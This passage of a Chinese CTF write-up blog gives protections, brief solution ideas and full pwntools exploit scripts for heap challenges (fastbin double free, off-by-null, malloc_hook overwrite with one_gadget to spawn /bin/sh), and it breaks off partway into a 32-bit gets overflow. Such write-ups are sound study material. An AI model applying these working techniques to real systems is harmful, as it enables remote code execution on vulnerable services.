class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote('123.60.135.228',2094)</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    p = process(<span class="hljs-string">'./emo_chunk'</span>)<br>    <span class="hljs-comment">#p = remote('123.60.135.228',2064)</span><br>    elf = ELF(<span class="hljs-string">'./emo_chunk'</span>)<br>    libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"5"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">i,j</span>):<br><br>    heaparray = <span class="hljs-number">0x6020E0</span><br>    backdoor = <span class="hljs-number">0x400946</span><br>    free_got = elf.got[<span class="hljs-string">'free'</span>]<br><br>    <span class="hljs-comment">#创建几个chunk</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5 隔离top chunk</span><br><br>    <span class="hljs-comment">#泄露libc</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">'\xe1'</span> + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">7</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#debug()</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#1</span><br>    show(<span class="hljs-number">2</span>)<br>    libc_base = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x3c4b78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc_base -&gt; "</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment">#计算地址</span><br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>    realloc = libc_base + libc.sym[<span class="hljs-string">'realloc'</span>]<br><br>    one = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br>    one_gadget = libc_base + one[i]<br><br>    delete(<span class="hljs-number">4</span>)<br><br>    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook - <span class="hljs-number">0x23</span>))<br>    <span class="hljs-comment">#debug()</span><br><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#malloc 6</span><br><br>    <span class="hljs-comment">#思路1,将malloc_hook改成one_gadget，但是打不通</span><br>    <span class="hljs-comment">#payload = 'a'*(0x23-0x10) + p64(one_gadget)</span><br>    <span class="hljs-comment">#思路2,将realloc_hook改成one_gadget,调栈</span><br>    <span class="hljs-comment">#payload = 'a'*(0x23-0x10-0x8) + p64(one_gadget) + p64(realloc + j) #将malloc_hook修改成realloc_hook</span><br>    <span class="hljs-comment">#思路3,题目有后门,直接改malloc_hook为后门函数</span><br>    payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x23</span>-<span class="hljs-number">0x10</span>) + p64(backdoor)<br>    edit(<span class="hljs-number">6</span>,payload)<br><br>    add(<span class="hljs-number">0x68</span>)<br><br>    p.interactive()<br><br><br><span class="hljs-comment"># for i in range(4):</span><br><span class="hljs-comment">#     for j in [2,4,6,8,10]:</span><br><span class="hljs-comment">#         try:</span><br><span class="hljs-comment">#             print("i :",i)</span><br><span class="hljs-comment">#             print("j :",j)</span><br><span class="hljs-comment">#             p = process('./emo_chunk')</span><br><span class="hljs-comment">#             pwn(i,int(j))</span><br><span class="hljs-comment">#         except:</span><br><span class="hljs-comment">#             p.close()</span><br><span class="hljs-comment">#注释为暴力调栈,得出i = 1, j = 8</span><br><br>connect()<br>pwn(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)<br><br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527aexecve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure><h2 id="double-free"><a href="#double-free" class="headerlink" title="double-free"></a>double  free</h2><h3 id="程序保护-2"><a href="#程序保护-2" class="headerlink" title="程序保护-2"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路-2"></a>解题思路</h3><p>double free 可以申请任何我们想要的地址的一个chunk，进而修改内容，本题目就是修改bss段上的值为固定值，进而getshell，具体做法就是申请2个chunk，制造double ，free，形成chunk 1 -&gt; chunk 2 &lt;- chunk 1，修改chunk 1 的指向为目标地址，然后通过连续的malloc 4次，既可申请到目标地址，最后修改chunk内容即可</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp-2"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">'linux'</span>, arch=<span class="hljs-string">'amd64'</span>, log_level=<span class="hljs-string">'debug'</span>)<br>p = process(<span class="hljs-string">'./heap_Double_Free'</span>)<br><span class="hljs-comment">#p = remote('123.60.135.228',2133)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'root@ubuntu:~/Desktop$ '</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'please input id and size :\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell</span>():<br>    cmd(<span class="hljs-string">"4"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br><br>goal = <span class="hljs-number">0x6010b0</span> <span class="hljs-comment">#将这里的值改为 257</span><br>fd = <span class="hljs-number">0x6010b0</span><br>create(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'bbbb'</span>) <span class="hljs-comment">#1</span><br><span class="hljs-comment">#create(2,16,'cccc') #2 防止和topchunk合并</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#double free</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,p64(goal-<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#3</span><br>create(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#4</span><br>create(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#5</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0x101</span>)) <span class="hljs-comment">#6</span><br>debug()<br>getshell()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="easychunk"><a href="#easychunk" class="headerlink" title="easychunk"></a>easychunk</h2><h3 id="程序保护-3"><a href="#程序保护-3" class="headerlink" title="程序保护-3"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路-3"></a>解题思路</h3><p>offbynull</p><ul><li>申请4个chunk，free掉chunk 0。然后编辑chunk1，覆写chunk2的prev_size为chunk0 + chun1，size低位为0，表示前面的chunk为free chunk</li><li>chunk 0 chunk 1 会合并，但是 chunk 1 始终存在，合并后放入了unsorted bin 中，申请一个同样大小的chunk 5收回chunk0，这样chunk 1的fd 和bk都是main_arena_88，泄露libc地址</li><li>最后通过fastbin向malloc_hook-0x23申请地址，最后修改malloc_hook 为 og</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp-3"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote('123.60.135.228',2094)</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    local = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> local:<br>        p = process(<span class="hljs-string">'./easychunk'</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2114</span>)<br>    elf = ELF(<span class="hljs-string">'./easychunk'</span>)<br>    libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please give me a name for item:\n'</span>)<br>    p.sendline(<span class="hljs-string">'aaaa'</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Content of Emo!:\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"5"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br>    dem = <span class="hljs-string">"hello,everyone.Welcome to:Polar D&amp;N:"</span><br>    p.recvuntil(<span class="hljs-string">'Where are you from?\n'</span>)<br>    p.sendline(dem)<br>    <span class="hljs-comment">#申请几个chunk</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"aaaa"</span>) <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"bbbb"</span>) <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"cccc"</span>) <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"dddd"</span>) <span class="hljs-comment">#3</span><br><br>    <span class="hljs-comment">#free掉chunk0</span><br>    delete(<span class="hljs-number">0</span>) <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#通过编辑chunk1溢出chunk2的size的inues位为0,注意chunk2的prevsize位为chunk0size+chunk2size</span><br>    pay0 = <span class="hljs-string">'a'</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0x200</span>)<br>    edit(<span class="hljs-number">1</span>,pay0)<br>    delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#2</span><br><br>    <span class="hljs-comment">#泄露libc</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"aaaa"</span>) <span class="hljs-comment">#0</span><br>    show(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">'content:\n'</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<br>    <span class="hljs-comment">#print("main_arena88",hex(main_arena))</span><br>    libc_base = main_arena - <span class="hljs-number">0x3c4b78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc_base"</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>    realloc_hook = libc_base + libc.sym[<span class="hljs-string">'realloc'</span>]<br>    one = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br><br>    one_gadget = libc_base + one[<span class="hljs-number">1</span>]<br><br>    <span class="hljs-comment">#修改chunk1的fd改为malloc_hook - 0x23</span><br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b'aaa'</span>) <span class="hljs-comment">#2-&gt;1</span><br>    delete(<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">1</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br><br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#2</span><br><br>    payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x23</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span>) + p64(one_gadget) + p64(realloc_hook+<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#debug()</span><br>    add(<span class="hljs-number">0x68</span>,payload)<br><br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please give me a name for item:\n'</span>)<br>    p.sendline(<span class="hljs-string">'aaaa'</span>)<br>    p.interactive()<br><br>connect()<br>pwn()<br><br><span class="hljs-comment"># for i in range(4):</span><br><span class="hljs-comment">#     for j in [2,4,6,8,10]:</span><br><span class="hljs-comment">#         try:</span><br><span class="hljs-comment">#             print("i :",i)</span><br><span class="hljs-comment">#             print("j :",j)</span><br><span class="hljs-comment">#             p = process('./emo_chunk')</span><br><span class="hljs-comment">#             pwn(i,int(j))</span><br><span class="hljs-comment">#         except:</span><br><span class="hljs-comment">#             p.close()</span><br><span class="hljs-comment">#注释为暴力调栈,得出i = 1, j = 8</span><br><br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527aexecve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br><br></code></pre></td></tr></tbody></table></figure><h2 id="fish"><a href="#fish" class="headerlink" title="fish"></a>fish</h2><h3 id="程序保护-4"><a href="#程序保护-4" class="headerlink" title="程序保护-4"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路-4"></a>解题思路</h3><p>函数存在gets，溢出控制返回地址为bss段上再执行一次gets。直接溢出输入system(“/bin/sh”)</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp-4"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2060</span>)<br><span class="hljs-comment">#p = process('./fish')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./fish'</span>)<br>sys = elf.plt[<span class="hljs-string">'system'</span>]<br><span class="hljs-built_in">print</span>(<span 